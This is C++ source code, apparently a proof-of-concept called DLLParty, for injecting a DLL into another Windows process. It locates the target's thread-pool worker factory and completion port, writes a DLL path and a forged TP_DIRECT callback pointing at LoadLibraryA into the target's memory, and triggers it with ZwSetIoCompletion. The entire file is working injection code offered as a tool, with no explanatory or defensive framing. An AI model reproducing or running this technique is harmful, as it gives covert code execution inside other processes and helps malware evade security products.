#include<windows.h>
#include<winternl.h>
#include<stdio.h>
#include<vector>

#include "types.hpp"
#include "pool_worker_instances.hpp"

TP_DIRECT direct = {0};

UCHAR GetWorkerFactoryTypeIndex(void) {
    HMODULE hNtDll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtDll) return 0;

    pfnNtQueryObject NtQueryObject = (pfnNtQueryObject)GetProcAddress(hNtDll, "NtQueryObject");
    if (!NtQueryObject) return 0;

    ULONG bufferSize = 0x10000;
    BYTE* buffer = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufferSize);
    if (!buffer) return 0;

    NTSTATUS status;

    while ((status = NtQueryObject(
        NULL,
        (OBJECT_INFORMATION_CLASS)3,
        buffer,
        bufferSize,
        &bufferSize)) == STATUS_INFO_LENGTH_MISMATCH) {

        BYTE* newBuffer = (BYTE*)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buffer, bufferSize);
        if (!newBuffer) {
            HeapFree(GetProcessHeap(), 0, buffer);
            return 0;
        }
        buffer = newBuffer;
    }

    if (status != STATUS_SUCCESS) {
        HeapFree(GetProcessHeap(), 0, buffer);
        return 0;
    }

    POBJECT_TYPES_INFORMATION typesInfo = (POBJECT_TYPES_INFORMATION)buffer;
    ULONG_PTR firstEntry =
    ((ULONG_PTR)(buffer + sizeof(ULONG)) + sizeof(PVOID) - 1) &
    ~((ULONG_PTR)sizeof(PVOID) - 1);

    BYTE* currentPtr = (BYTE*)firstEntry;
    UCHAR foundIndex = 0;

    UNICODE_STRING targetName;
    RtlInitUnicodeString(&targetName, L"TpWorkerFactory");

    for (ULONG i = 0; i < typesInfo->NumberOfTypes; i++) {
        POBJECT_TYPE_INFORMATION_ENTRY typeEntry = (POBJECT_TYPE_INFORMATION_ENTRY)currentPtr;

        if (typeEntry->TypeName.Buffer != NULL) {
            USHORT targetLen = (USHORT)(wcslen(L"TpWorkerFactory") * sizeof(WCHAR));
            if (typeEntry->TypeName.Length == targetLen) {
                if (_wcsnicmp(typeEntry->TypeName.Buffer, L"TpWorkerFactory", targetLen / sizeof(WCHAR)) == 0) {
                    foundIndex = (typeEntry->TypeIndex != 0) ? typeEntry->TypeIndex : (UCHAR)(i + 1);
                    break;
                }
            }
        }

        ULONG_PTR nextAddress = (ULONG_PTR)typeEntry->TypeName.Buffer + typeEntry->TypeName.MaximumLength;
        nextAddress = (nextAddress + sizeof(ULONG_PTR) - 1) & ~(sizeof(ULONG_PTR) - 1);
        currentPtr = (BYTE*)nextAddress;
    }

    HeapFree(GetProcessHeap(), 0, buffer);
    return foundIndex;
}


BOOL dll_party_injection(HANDLE proc_handle,DWORD total_worker_count, LPVOID*last_ptr,uintptr_t target_pool_ptr){


    std::vector<uintptr_t>tpt_instances = FindRemoteTpCallbackInstanceSlotsFromPool(proc_handle,target_pool_ptr);
    const char dllPath[] = "D:\\cpp\\DllParty\\poc\\testDll.dll";
    const SIZE_T dll_path_size = sizeof(dllPath);
    

    //*(last_ptr)=VirtualAllocEx(proc_handle,NULL,sizeof(TP_DIRECT),MEM_COMMIT | MEM_RESERVE,PAGE_READWRITE);
    *(last_ptr) = (LPVOID)((PBYTE)tpt_instances[tpt_instances.size()-1]-0x500);
    if(*(last_ptr)==NULL){printf("[-] Memory allocation failed!\n");return FALSE;}
         
    for(int i=0;i<tpt_instances.size();i++){

        if(WriteProcessMemory(proc_handle,(PVOID)tpt_instances[i],dllPath,dll_path_size,NULL)==0){
            printf("[-] Dll path injection failed!\n");
            return FALSE;
        }
        
    }
    
    FARPROC ld_lib_addr = GetProcAddress(GetModuleHandleA("Kernel32"),"LoadLibraryA");
    if(ld_lib_addr==NULL){printf("[-] Couldn't fetch LoadLibraryA address!\n");return FALSE;}
    direct.Callback= (PVOID)ld_lib_addr;
    return TRUE;
}


int main(int argc, char *argv[]){
    
    
    HANDLE target_worker_factory;
    PVOID target_pool_ptr;
    HANDLE IOCP_port;
    DWORD pool_worker_count = 0;

    DWORD procId = atoi(argv[1]);
    printf("[+] The requested process id:%d\n",procId);


    HANDLE proc_handle = OpenProcess(PROCESS_ALL_ACCESS,FALSE,procId);
    if(proc_handle == NULL){printf("[-] Couldn't open the requested process!");return 0;}

    PSYSTEM_HANDLE_INFORMATION info;
    ULONG buf_size = 0x10000;
    NTSTATUS status;
    do{
        info = (PSYSTEM_HANDLE_INFORMATION)malloc(buf_size);
        status=NtQuerySystemInformation(SystemHandleInformation,info,buf_size,&buf_size);
        if(status == STATUS_INFO_LENGTH_MISMATCH){
            free(info);
            buf_size = buf_size * 2;
        }
    }while(status == STATUS_INFO_LENGTH_MISMATCH);

    printf("[+] System information fetched!\n");

    DWORD WorkerFactoryObjectType = GetWorkerFactoryTypeIndex();

    printf("[+] Worker Factory Object Type index found: %d\n", WorkerFactoryObjectType);
    for(int i=0;i<info->Count;i++){
        SYSTEM_HANDLE_ENTRY entry = info->Handle[i];
        
        if(entry.OwnerPid != procId){continue;}
        if(entry.ObjectType!=WorkerFactoryObjectType){continue;}
        printf("[+] Found the worker factory!\n");
        
        HANDLE wf_dup_handle;
        if(DuplicateHandle(proc_handle,(HANDLE)(ULONG_PTR)entry.HandleValue,GetCurrentProcess(),&wf_dup_handle,0,FALSE,DUPLICATE_SAME_ACCESS)==0){
            printf("[-] Error duplicating the worker factory handle: %d",GetLastError());
            return 1;
        }

        printf("[+] Duplicated the worker factory handle!\n");
        
        WORKER_FACTORY_BASIC_INFORMATION wfbi;
        NtQueryInformationWorkerFactory_t NtQueryInformationWorkerFactory = (NtQueryInformationWorkerFactory_t)GetProcAddress(GetModuleHandleA("ntdll"),"NtQueryInformationWorkerFactory");
        if(!NtQueryInformationWorkerFactory){printf("[-] Couldn't resolve NtQueryInformatioNWorkerFactory function!\n");break;}
        printf("[+] NtQueryInformationWorkerFactory resolved!\n");

        NTSTATUS nqiwf_status=NtQueryInformationWorkerFactory(wf_dup_handle,WorkerFactoryBasicInformation,&wfbi,sizeof(wfbi),NULL);
        if(!NT_SUCCESS(nqiwf_status)){
            printf("[-] NtQueryInformationWorkerFactory status failed!\n");
            return 1;
        }
        printf("[+] Accuired TP_POOL object\n");
        printf("[+] Worker count: %d\n",wfbi.TotalWorkerCount);
        if(wfbi.TotalWorkerCount == 0 ){
            printf("[-] Total worker count in this pool is 0, searching on...\n");
            continue;
        }
        target_pool_ptr = wfbi.StartParameter;
        target_worker_factory = wf_dup_handle;

        FULL_TP_POOL_PREFIX pool = {0};
        SIZE_T bytes_read =0;
        if(!ReadProcessMemory(proc_handle,target_pool_ptr,&pool,sizeof(pool),&bytes_read)){
            printf("[-] Error gettint IOCP from TP_POOL object!\n");
            return 1;
        }
        printf("[+] Fetched the IOCP port from workerFactory object\n");
        
        IOCP_port = (HANDLE)pool.CompletionPort;
        pool_worker_count = wfbi.TotalWorkerCount;
        break;
    }
    
    LPVOID last_ptr = NULL;
    if(!dll_party_injection(proc_handle,pool_worker_count,&last_ptr,(uintptr_t)target_pool_ptr)){printf("[-] DLLParty failed!\n");return 1;}


    if(WriteProcessMemory(proc_handle,last_ptr,&direct,sizeof(TP_DIRECT),NULL)==0){printf("[-] WriteProcessMemory failed! \n");return 1;}

    HANDLE iocp_handle; 
    if(DuplicateHandle(proc_handle,IOCP_port,GetCurrentProcess(),&iocp_handle,0,FALSE,DUPLICATE_SAME_ACCESS)==0){printf("[-] Handle duplication failed!\n");return 1;}
    

    typedef NTSTATUS (NTAPI *ZwSetIoCompletion_t)(
    HANDLE IoCompletionHandle,
    PVOID KeyContext,
    PVOID ApcContext,
    NTSTATUS IoStatus,
    ULONG_PTR IoStatusInformation
);

    ZwSetIoCompletion_t ZwSetIoCompletion =(ZwSetIoCompletion_t )GetProcAddress(GetModuleHandleA("ntdll"),"ZwSetIoCompletion");
    NTSTATUS inj_status = ZwSetIoCompletion(iocp_handle,(LPVOID)last_ptr,0,0,0);

    if(!NT_SUCCESS(inj_status)){
        printf("[-] Final syscall failed, NtSetIoCompletionEx"); return 1;
    }
    printf("[+] Injection finished!");
    return 0;
}